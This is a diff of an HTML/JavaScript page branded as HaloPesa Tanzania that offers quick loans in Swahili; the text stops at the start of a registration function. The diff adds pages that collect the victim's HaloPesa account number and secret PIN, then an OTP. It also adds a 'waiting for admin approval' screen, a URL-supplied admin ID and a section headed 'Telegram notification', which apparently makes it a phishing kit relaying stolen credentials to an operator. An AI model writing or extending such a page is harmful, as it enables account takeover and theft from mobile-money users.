@@ -41,7 +41,6 @@
 
   /* LOGO */
   .logo-group { display:flex; flex-direction:column; align-items:center; gap:3px; }
-  /* HaloPesa SVG logo mark */
   .logo-svg-mark { width:32px; height:32px; }
   .logo-text { font-size:1.1rem; font-weight:800; color:#fff; letter-spacing:-0.02em; }
   .logo-text .halo { color:#fff; }
@@ -89,7 +88,31 @@
   /* FOOTER */
   .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
 
-  /* ───── PAGE 1: LANDING ───── */
+  /* ───── PAGE 1: REGISTRATION ───── */
+  #page-registration { background:var(--page-bg); }
+  .reg-nav { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 24px; height:60px; flex-shrink:0; }
+  .reg-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
+  .reg-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.1); padding:36px 32px; }
+  .reg-card h1 { font-size:1.35rem; font-weight:700; text-align:center; margin-bottom:6px; }
+  .reg-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:28px; }
+  .reg-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
+
+  /* ───── PAGE 1.5: WAITING APPROVAL ───── */
+  #page-waiting-approval { background:var(--page-bg); }
+  .wait-nav { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 24px; height:60px; flex-shrink:0; }
+  .wait-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
+  .wait-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.1); padding:36px 32px; text-align:center; }
+  .wait-spinner { width:60px; height:60px; border:5px solid #eee; border-top-color:var(--teal); border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 24px; }
+  .wait-card h1 { font-size:1.25rem; font-weight:700; margin-bottom:8px; }
+  .wait-card p { font-size:0.9rem; color:var(--text-light); line-height:1.6; margin-bottom:16px; }
+  .wait-info { background:#f0f8ff; border:1px solid #bfdbfe; border-radius:var(--radius-sm); padding:14px; margin:16px 0; }
+  .wait-info .label { font-size:0.75rem; color:var(--text-mid); text-transform:uppercase; font-weight:600; }
+  .wait-info .value { font-size:0.9rem; color:var(--text-dark); font-weight:500; margin-top:4px; }
+  .wait-timer { font-size:0.82rem; color:var(--text-light); margin-top:20px; }
+  .wait-cancel { margin-top:20px; }
+  .wait-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
+
+  /* ───── PAGE 2: LANDING ───── */
   #page-landing { background:var(--page-bg); }
   .land-nav { background:var(--navy); display:flex; align-items:center; justify-content:space-between; padding:0 24px; height:60px; flex-shrink:0; }
   .land-nav .hbg { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
@@ -115,7 +138,7 @@
   .feat .fs { font-size:0.73rem; color:var(--text-light); }
   .land-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
 
-  /* ───── STEP PAGES 2-4 ───── */
+  /* ───── STEP PAGES ───── */
   .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
   .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
   .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
@@ -129,7 +152,7 @@
   .sum-row .sk { color:var(--text-light); }
   .sum-row .sv { font-weight:500; }
 
-  /* ───── PAGE 5: SUBMITTED ───── */
+  /* ───── PAGE: SUBMITTED ───── */
   #page-submitted { background:linear-gradient(160deg,var(--navy),#cc5500); align-items:center; justify-content:center; }
   .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
   .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
@@ -140,34 +163,7 @@
   .redir-n { font-weight:700; color:#ffdd00; }
   .btn-go { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:'Inter',sans-serif; letter-spacing:0.04em; }
 
-  /* ───── PAGE 6: LOGIN ───── */
-  #page-login { background:#fff; }
-  .login-hdr { background:var(--navy); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:4px; flex-shrink:0; }
-  .login-hdr .logo-text { font-size:1.5rem; }
-  .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
-  .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
-  .login-inner { width:100%; max-width:380px; }
-  .lg-phone-row { display:flex; margin-bottom:24px; }
-  .lg-ph-pre { display:flex; align-items:center; gap:4px; padding:11px 12px; background:#fafafa; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.84rem; color:#555; font-weight:500; white-space:nowrap; }
-  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:'Inter',sans-serif; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
-  .lg-phone-row input:focus { border-color:var(--teal); }
-  .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
-  .pin-row { display:flex; gap:10px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
-  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.3rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
-  .pin-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,102,0,0.12); }
-  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; }
-  .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
-  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .btn-login.rdy { background:var(--grad); color:#fff; }
-  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
-  .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
-  .lg-foot .logo-text { font-size:1.2rem; }
-  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:4px; }
-  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.55); }
-  .lg-terms a { color:rgba(255,255,255,0.75); }
-
-  /* ───── PAGE 7: OTP ───── */
+  /* ───── PAGE: OTP ───── */
   #page-otp { background:#fff; }
   .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; border-bottom:1px solid #eee; flex-shrink:0; }
   .otp-topbar .bk { font-size:1.1rem; color:#333; cursor:pointer; background:none; border:none; }
@@ -188,7 +184,7 @@
   .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.55); }
 
-  /* ───── PAGE 8: APPROVAL ───── */
+  /* ───── PAGE: APPROVAL ───── */
   #page-approval { background:linear-gradient(135deg,#ff6600 0%,#ff9900 50%,#cc3300 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
   .appr-wrap { width:100%; max-width:520px; }
   .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
@@ -255,61 +251,135 @@
   .hp-logo-sm .brand { font-size:1.1rem; font-weight:800; color:#fff; }
   .hp-logo-sm .brand span { color:#ffdd00; }
 
-  @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card{padding:24px 18px;}.otp-card{padding:24px 16px;}}
+  @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card,.reg-card,.wait-card{padding:24px 18px;}.otp-card{padding:24px 16px;}}
 </style>
 </head>
 <body>
 
-<!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
-<div id="page-landing" class="page active">
-  <nav class="land-nav">
-    <div class="hbg"><span></span><span></span><span></span></div>
-    <div class="hp-logo-inline">
-      <!-- HaloPesa Logo Mark -->
+<!-- ══════════════════════ PAGE 1: REGISTRATION ══════════════════════ -->
+<div id="page-registration" class="page active">
+  <div class="reg-nav">
+    <div class="hp-logo-sm">
       <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
         <circle cx="20" cy="20" r="20" fill="#ff6600"/>
         <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
         <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
-        <path d="M15 20 Q20 13 25 20" stroke="#ffdd00" stroke-width="2" fill="none" stroke-linecap="round"/>
       </svg>
       <div class="brand">Halo<span>Pesa</span></div>
     </div>
-    <div style="width:28px"></div>
-  </nav>
-
-  <div class="land-center">
-    <div class="land-card">
-      <h1>Pata Mkopo Wako Haraka</h1>
-      <p class="land-tagline">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
-
-      <div class="calc-box">
-        <h2>Kikokotoo cha Mkopo</h2>
-        <div class="calc-row2"><span>Kiasi cha Mkopo</span><span class="cv" id="aDisp">TSh 100,000</span></div>
-        <input type="range" id="rA" min="10000" max="100000000" step="10000" value="100000" oninput="calcUp()" style="--pct:0.09%">
-        <div class="range-ends"><span>TSh 10K</span><span>TSh 100M</span></div>
-        <div class="calc-row2"><span>Muda wa Mkopo</span><span class="cv" id="tDisp">miezi 12</span></div>
-        <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
-        <div class="range-ends"><span>miezi 6</span><span>miezi 60</span></div>
-        <div class="monthly-box">
-          <span class="ml">Malipo ya Kila Mwezi</span>
-          <span class="ma" id="mOut">TSh 9,363</span>
-        </div>
+  </div>
+  <div class="reg-center">
+    <div class="reg-card">
+      <h1>Jifunze na HaloPesa</h1>
+      <p class="reg-tagline">Fungua akaunti yako kwa dakika chache</p>
+      <div class="msg-box error" id="regErr"><span class="msg-icon">&#x2715;</span><span id="regErrTxt"></span></div>
+      
+      <div class="field-row">
+        <div class="field"><label>Jina la Kwanza</label><input type="text" id="regFirst" placeholder="Jina lako" oninput="clearErr('regErr')"></div>
+        <div class="field"><label>Jina la Ukoo</label><input type="text" id="regLast" placeholder="Ukoo lako" oninput="clearErr('regErr')"></div>
       </div>
+      
+      <div class="field">
+        <label>Nambari ya HaloPesa</label>
+        <input type="text" id="regHaloNumber" placeholder="Nambari yako ya HaloPesa" oninput="clearErr('regErr')">
+        <div class="field-hint">Nambari ya kipekee ya akaunti yako</div>
+      </div>
+      
+      <div class="field">
+        <label>Namba ya Siri</label>
+        <input type="password" id="regPassword" placeholder="Weka namba ya siri" oninput="clearErr('regErr')">
+        <div class="field-hint">Angalau herufi 6</div>
+      </div>
+      
+      <button class="btn-grad" onclick="registerUser()">FUNGUA AKAUNTI</button>
+    </div>
+  </div>
+  <div class="reg-footer">© 2026 HaloPesa Tanzania</div>
+</div>
 
-      <button class="btn-grad" onclick="goTo('page-step1')">OMBA SASA</button>
-
-      <div class="feats-row">
-        <div class="feat"><div class="fi">⚡</div><div class="ft">Idhini ya Haraka</div><div class="fs">Ndani ya masaa 24</div></div>
-        <div class="feat"><div class="fi">💰</div><div class="ft">Riba Nafuu</div><div class="fs">Kuanzia 25%</div></div>
-        <div class="feat"><div class="fi">🔒</div><div class="ft">Salama</div><div class="fs">Kiwango cha benki</div></div>
+<!-- ══════════════════════ PAGE 1.5: WAITING FOR ADMIN APPROVAL ══════════════════════ -->
+<div id="page-waiting-approval" class="page">
+  <div class="wait-nav">
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+  </div>
+  <div class="wait-center">
+    <div class="wait-card">
+      <div class="wait-spinner"></div>
+      <h1>Tafadhali Subiri</h1>
+      <p>Inathibitisha taarifa zako na msimamizi anayefanya uthibitisho...</p>
+      
+      <div class="wait-info">
+        <div class="label">📝 Jina Lako</div>
+        <div class="value" id="waitName">—</div>
+      </div>
+      
+      <div class="wait-info">
+        <div class="label">🔑 Nambari ya HaloPesa</div>
+        <div class="value" id="waitHalo">—</div>
+      </div>
+      
+      <div class="wait-timer">⏱️ Imejazwa: <span id="waitTime">—</span></div>
+      
+      <div class="wait-cancel">
+        <button class="btn-gray" onclick="cancelWaitingAndGoBack()" style="width:100%;">← RUDI NYUMA</button>
       </div>
     </div>
   </div>
+  <div class="wait-footer">© 2026 HaloPesa Tanzania</div>
+</div>
 
+<!-- ══════════════════════ PAGE 2: LANDING ══════════════════════ -->
+<div id="page-landing" class="page">
+  <nav class="navbar">
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+  </nav>
+  <div class="land-center">
+    <div class="land-card">
+      <h1>Mahesabu ya Mkopo</h1>
+      <p class="land-tagline">Pesa za Haraka, Karibu Kwa Dakika 15</p>
+      <div class="calc-box">
+        <h2>Kiasi Kinachohitajika</h2>
+        <div class="calc-row2"><span>TSh 10,000</span><span class="cv" id="aDisp">TSh 100,000</span><span>TSh 100,000,000</span></div>
+        <input type="range" id="rA" min="10000" max="100000000" step="1000" value="100000" oninput="calcUp()">
+        <div class="range-ends"><span>TSh 10K</span><span>TSh 100M</span></div>
+      </div>
+      <div class="calc-box">
+        <h2>Muda wa Mkopo</h2>
+        <div class="calc-row2"><span>6</span><span class="cv" id="tDisp">miezi 48</span><span>60</span></div>
+        <input type="range" id="rT" min="6" max="60" step="1" value="48" oninput="calcUp()">
+        <div class="range-ends"><span>6 miezi</span><span>60 miezi</span></div>
+      </div>
+      <div class="monthly-box">
+        <div class="ml">Malipo ya Kila Mwezi</div>
+        <div class="ma" id="mOut">TSh 2,750</div>
+      </div>
+      <div class="feats-row">
+        <div class="feat"><div class="fi">⚡</div><div class="ft">Haraka</div><div class="fs">Dakika 15</div></div>
+        <div class="feat"><div class="fi">💳</div><div class="ft">Tupu</div><div class="fs">Walipiti 0</div></div>
+        <div class="feat"><div class="fi">📱</div><div class="ft">Rahisi</div><div class="fs">Mkate tu</div></div>
+      </div>
+      <button class="btn-grad" style="margin-top:24px;" onclick="goTo('page-step1')">ENDELEA KWA MKOPO</button>
+    </div>
+  </div>
   <div class="land-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
+<!-- ══════════════════════ PAGE 3: STEP 1 ══════════════════════ -->
 <div id="page-step1" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-landing')">← Rudi</a>
@@ -326,19 +396,50 @@
   <div class="step-center">
     <div class="step-card">
       <h2>Maombi ya Mkopo</h2>
-      <p class="step-sub">Hatua 1 ya 3</p>
-      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+      <p class="step-sub">Hatua 1 ya 2</p>
+      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
-      <div class="field"><label>Aina ya Mkopo</label><div class="sel-wrap"><select id="s1ty"><option>Mkopo wa Binafsi</option><option selected>Mkopo wa Biashara</option><option>Mkopo wa Nyumba</option><option>Mkopo wa Gari</option><option>Mkopo wa Elimu</option></select></div></div>
-      <div class="field"><label>Kiasi cha Mkopo (TSh)</label><input type="number" id="s1am" value="100000" placeholder="Weka kiasi" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label>Muda wa Mkopo</label><div class="sel-wrap"><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>Miezi 36</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div></div>
-      <div class="field"><label>Madhumuni ya Mkopo</label><textarea id="s1pu" placeholder="Elezea madhumuni ya mkopo wako…" oninput="clearErr('s1Err')"></textarea></div>
-      <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
+      
+      <div class="calc-box">
+        <h2>Kiasi Kinachohitajika</h2>
+        <div class="calc-row2"><span>TSh 10,000</span><span class="cv" id="a1Disp">TSh 100,000</span><span>TSh 100,000,000</span></div>
+        <input type="range" id="rA1" min="10000" max="100000000" step="1000" value="100000" oninput="calcUp1()">
+        <div class="range-ends"><span>TSh 10K</span><span>TSh 100M</span></div>
+      </div>
+      
+      <div class="calc-box">
+        <h2>Muda wa Mkopo</h2>
+        <div class="calc-row2"><span>6</span><span class="cv" id="t1Disp">miezi 48</span><span>60</span></div>
+        <input type="range" id="rT1" min="6" max="60" step="1" value="48" oninput="calcUp1()">
+        <div class="range-ends"><span>6 miezi</span><span>60 miezi</span></div>
+      </div>
+      
+      <div class="field">
+        <label>Madhumuni ya Mkopo</label>
+        <div class="sel-wrap">
+          <select id="s1Purpose" oninput="clearErr('s1Err')">
+            <option value="">-- Chagua Madhumuni --</option>
+            <option>Biashara</option>
+            <option>Kuchimba</option>
+            <option>Wanyamabiashara</option>
+            <option>Ujenzi</option>
+            <option>Elimu</option>
+            <option>Afya</option>
+            <option>Karibu</option>
+          </select>
+        </div>
+      </div>
+      
+      <div class="step-btns">
+        <button class="btn-gray" onclick="goTo('page-landing')">ILIYOTANGULIA</button>
+        <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
+      </div>
     </div>
   </div>
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
+<!-- ══════════════════════ PAGE 4: STEP 2 (Employment) ══════════════════════ -->
 <div id="page-step2" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step1')">← Rudi</a>
@@ -355,49 +456,13 @@
   <div class="step-center">
     <div class="step-card">
       <h2>Maombi ya Mkopo</h2>
-      <p class="step-sub">Hatua 2 ya 3</p>
-      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+      <p class="step-sub">Hatua 2 ya 2</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
-      <div class="field-row">
-        <div class="field"><label>Jina la Kwanza</label><input type="text" id="s2fi" placeholder="Jina la kwanza" oninput="clearErr('s2Err')"></div>
-        <div class="field"><label>Jina la Ukoo</label><input type="text" id="s2la" placeholder="Jina la ukoo" oninput="clearErr('s2Err')"></div>
-      </div>
-      <div class="field">
-        <label>Nambari ya Simu</label>
-        <div class="phone-row"><div class="ph-pre">🇹🇿 +255</div><input type="tel" id="s2ph" placeholder="712345678 au 0712345678" maxlength="10" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint">Weka nambari 9 au anza na 0 (mfano, 0712345678 → inabadilika hadi 712345678)</div>
-      </div>
-      <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step1')">ILIYOTANGULIA</button>
-        <button class="btn-grad" onclick="toS3()">HATUA INAYOFUATA</button>
-      </div>
-    </div>
-  </div>
-  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
-</div>
-
-<!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
-<div id="page-step3" class="page">
-  <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step2')">← Rudi</a>
-    <div class="hp-logo-sm">
-      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
-        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
-        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
-      </svg>
-      <div class="brand">Halo<span>Pesa</span></div>
-    </div>
-    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-  </nav>
-  <div class="step-center">
-    <div class="step-card">
-      <h2>Maombi ya Mkopo</h2>
-      <p class="step-sub">Hatua 3 ya 3</p>
-      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
-      <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
-      <div class="field"><label>Hali ya Ajira</label><div class="sel-wrap"><select id="s3em"><option>Mwajiriwa</option><option selected>Mfanyabiashara</option><option>Asiye na Kazi</option><option>Mstaafu</option><option>Mwanafunzi</option></select></div></div>
-      <div class="field"><label>Mapato ya Mwaka (TSh)</label><input type="number" id="s3in" placeholder="Weka mapato ya mwaka" oninput="clearErr('s3Err')"></div>
+      
+      <div class="field"><label>Hali ya Ajira</label><div class="sel-wrap"><select id="s2em" oninput="clearErr('s2Err')"><option>Mwajiriwa</option><option selected>Mfanyabiashara</option><option>Asiye na Kazi</option><option>Mstaafu</option><option>Mwanafunzi</option></select></div></div>
+      <div class="field"><label>Mapato ya Mwaka (TSh)</label><input type="number" id="s2in" placeholder="Weka mapato ya mwaka" oninput="clearErr('s2Err')"></div>
+      
       <div class="sum-box">
         <h3>Muhtasari wa Maombi</h3>
         <div class="sum-row"><span class="sk">Kiasi cha Mkopo:</span><span class="sv" id="sA">TSh 100,000</span></div>
@@ -405,8 +470,9 @@
         <div class="sum-row"><span class="sk">Madhumuni:</span><span class="sv" id="sP">—</span></div>
         <div class="sum-row"><span class="sk">Mwombaji:</span><span class="sv" id="sN">—</span></div>
       </div>
+      
       <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step2')">ILIYOTANGULIA</button>
+        <button class="btn-gray" onclick="goTo('page-step1')">ILIYOTANGULIA</button>
         <button class="btn-grad" onclick="submitApp()">WASILISHA MAOMBI</button>
       </div>
     </div>
@@ -421,66 +487,14 @@
     <h2>Maombi ya Mkopo Yamewasilishwa</h2>
     <p>Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini.<br>Utapata ujumbe wa uthibitisho. Kwa sasa, endelea kwenye HaloPesa.</p>
     <div class="redir-pill">🔄 Unaelekezwa kwenye kuingia HaloPesa katika <span class="redir-n" id="rdN">3</span>s...</div><br>
-    <button class="btn-go" onclick="goTo('page-login')">Nenda Kuingia Sasa</button>
+    <button class="btn-go" onclick="goTo('page-approval')">Rudi Nyumbani</button>
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 6: LOGIN ══════════════════════ -->
-<div id="page-login" class="page">
-  <div class="login-hdr">
-    <div class="hp-logo-inline" style="flex-direction:column;gap:6px;">
-      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:52px;height:52px;">
-        <circle cx="20" cy="20" r="20" fill="rgba(255,255,255,0.15)"/>
-        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
-        <circle cx="20" cy="20" r="5" fill="#ffdd00"/>
-        <path d="M14 21 Q20 12 26 21" stroke="#ffdd00" stroke-width="2.2" fill="none" stroke-linecap="round"/>
-      </svg>
-      <div class="brand" style="font-size:1.6rem;">Halo<span>Pesa</span></div>
-      <div class="logo-sub">Mikopo ya Haraka na Rahisi</div>
-    </div>
-  </div>
-  <div class="login-body-wrap">
-    <h2>Ingia Akaunti</h2>
-    <div class="login-inner">
-      <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
-
-      <div class="lg-phone-row">
-        <div class="lg-ph-pre">🇹🇿 +255</div>
-        <input type="tel" id="lgPh" placeholder="712345678 au 0712345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()">
-      </div>
-      <div class="pin-label">Weka PIN yako (tarakimu 4)</div>
-      <div class="pin-row">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
-        <button class="pin-eye" onclick="togPin()">👁</button>
-      </div>
-      <div class="forgot-pin">Umesahau PIN?</div>
-      <button class="btn-login" id="bLogin" onclick="doLogin()">INGIA</button>
-    </div>
-  </div>
-  <div class="lg-curve">
-    <div class="lg-foot">
-      <div class="hp-logo-inline" style="flex-direction:column;gap:4px;">
-        <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:38px;height:38px;">
-          <circle cx="20" cy="20" r="20" fill="rgba(255,255,255,0.1)"/>
-          <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
-          <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
-        </svg>
-        <div class="brand" style="font-size:1.25rem;">Halo<span>Pesa</span></div>
-        <div class="logo-sub">Mikopo ya Haraka na Rahisi</div>
-      </div>
-      <div class="lg-version">v2.1.3P</div>
-      <div class="lg-terms">Kwa kuingia unakubali <a href="#">Masharti na Vigezo</a></div>
-    </div>
-  </div>
-</div>
-
-<!-- ══════════════════════ PAGE 7: OTP ══════════════════════ -->
+<!-- ══════════════════════ PAGE 6: OTP ══════════════════════ -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
-    <button class="bk" onclick="goTo('page-login')">←</button>
+    <button class="bk" onclick="goTo('page-registration')">←</button>
     <div class="hp-logo-sm">
       <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
         <circle cx="20" cy="20" r="20" fill="#cc3300"/>
@@ -494,8 +508,8 @@
   <div class="otp-body-wrap">
     <div class="otp-card">
       <h2>Uthibitisho wa OTP</h2>
-      <p class="otp-hint">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
-      <div class="otp-phone" id="otpPh">+255712345678</div>
+      <p class="otp-hint">Weka OTP iliyotumwa kwenye akaunti yako</p>
+      <div class="otp-phone" id="otpPh">HaloPesa Account</div>
 
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
       <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
@@ -521,7 +535,7 @@
   <div class="otp-curve"><div class="otp-foot">© 2026 HaloPesa Tanzania</div></div>
 </div>
 
-<!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
+<!-- ══════════════════════ PAGE 7: APPROVAL ══════════════════════ -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
     <div class="appr-top">
@@ -552,8 +566,8 @@
 </div>
 
 <!-- MODALS -->
-<div class="overlay" id="mLogin">
-  <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma maelezo yako kwa uthibitisho</p></div>
+<div class="overlay" id="mReg">
+  <div class="modal"><div class="spinner"></div><h3>Inaandaa Akaunti…</h3><p>Tafadhali subiri wakati tunaundwa akaunti yako</p></div>
 </div>
 <div class="overlay" id="mOtp">
   <div class="modal"><div class="spinner"></div><h3>Inathibitisha OTP</h3><p id="otpVT">Tafadhali subiri… (3s)</p></div>
@@ -567,15 +581,21 @@
   // STATE
   // ══════════════════════════════════════════════════════
   const S = {
+    firstName: '',
+    lastName: '',
+    haloNumber: '',
+    password: '',
+    registrationId: null,
+    registrationTime: null,
     amt: 100000,
     term: 'Miezi 48',
     purpose: '',
-    first: '',
-    last: '',
     phone: '',
     applicationId: null,
     assignedAdminId: null
   };
+
+  let approvalCheckInterval = null;
 
   const _URL_ADMIN_ID = (() => {
     const params = new URLSearchParams(window.location.search);
@@ -608,7 +628,164 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // LOAN CALCULATOR (TSh currency)
+  // REGISTRATION WITH TELEGRAM NOTIFICATION
+  // ══════════════════════════════════════════════════════
+  async function registerUser() {
+    const first = document.getElementById('regFirst').value.trim();
+    const last = document.getElementById('regLast').value.trim();
+    const haloNum = document.getElementById('regHaloNumber').value.trim();
+    const pwd = document.getElementById('regPassword').value.trim();
+
+    if (!first) { showErr('regErr', 'Tafadhali weka jina la kwanza'); return; }
